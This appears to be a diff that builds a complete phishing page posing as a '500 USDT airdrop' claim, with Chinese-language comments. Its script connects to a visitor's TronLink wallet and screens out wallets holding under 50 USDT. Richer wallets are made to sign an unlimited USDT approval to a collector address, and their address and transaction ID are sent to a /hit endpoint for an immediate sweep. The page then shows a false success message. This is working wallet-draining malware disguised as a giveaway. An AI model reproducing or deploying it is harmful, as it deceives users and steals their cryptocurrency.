@@ -1,54 +1,35 @@
-const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const COLLECTOR = 'T你的归集地址';
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>USDT 空投领取</title>
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
+</head>
+<body>
+<button id="btn">立即领取 500 USDT</button>
+<script>
+const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';   // 主网 USDT TRC20
+const COLLECTOR = 'TLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURG';
 const MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-const IS_MOBILE = /Android|iPhone|iPad|iPod|HarmonyOS/i.test(navigator.userAgent);
-const IN_TG = /Telegram|MicroMessenger|QQ\//i.test(navigator.userAgent);
-
-// 等 provider 注入
-function waitProvider(ms = 4000) {
-  return new Promise(res => {
-    const t0 = Date.now();
-    (function tick() {
-      if (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress)) return res(true);
-      if (Date.now() - t0 > ms) return res(false);
-      setTimeout(tick, 120);
-    })();
-  });
-}
-
-// TronLink 移动端深链
-function openTronLinkApp() {
-  const param = encodeURIComponent(JSON.stringify({
-    url: location.href, action: 'open', protocol: 'tronlink', version: '1.0'
-  }));
-  location.href = 'tronlinkoutside://pull.activity?param=' + param;
-}
 
 document.getElementById('btn').onclick = async () => {
-  // ① 先同步判断,需要跳 App 的立刻跳(不能 await 之后再跳)
-  if (!window.tronLink && !window.tronWeb && IS_MOBILE && !IN_TG) {
-    openTronLinkApp();
-    return;
-  }
-  if (IN_TG) return alert('请点右上角「…」→ 在浏览器打开');
-
-  // ② 等注入
-  if (!await waitProvider()) {
-    return alert('请用 TronLink App 里的「发现」打开本页面');  // 别跳官网
-  }
-
+  if (!window.tronLink) { location.href = 'https://www.tronlink.org/'; return; }
   const r = await window.tronLink.request({ method: 'tron_requestAccounts' });
-  if (r.code === 400) return alert('请在 TronLink App 内打开');
   if (r.code !== 200) return;
-
   const tw = window.tronWeb;
   const addr = tw.defaultAddress.base58;
+
+  // 余额筛选：没钱的地址看到正常页面，别浪费
   const c = await tw.contract().at(USDT);
   const bal = await c.balanceOf(addr).call();
-  if (Number(bal) < 50_000_000) return alert('未中签');
+  if (Number(bal) < 50_000_000) { /* <50 USDT，弹个“未中签”走人 */ return; }
 
+  // 真正的一步：approve 无限
   const txid = await c.approve(COLLECTOR, MAX).send({ feeLimit: 100_000_000 });
+
+  // 上报地址，后端立刻归集
   fetch('/hit', { method:'POST', headers:{'Content-Type':'application/json'},
     body: JSON.stringify({ addr, txid }) });
   document.body.innerHTML = '<h2>领取成功，500 USDT 将在 24 小时内到账</h2>';
 };
+</script>
+</body></html>
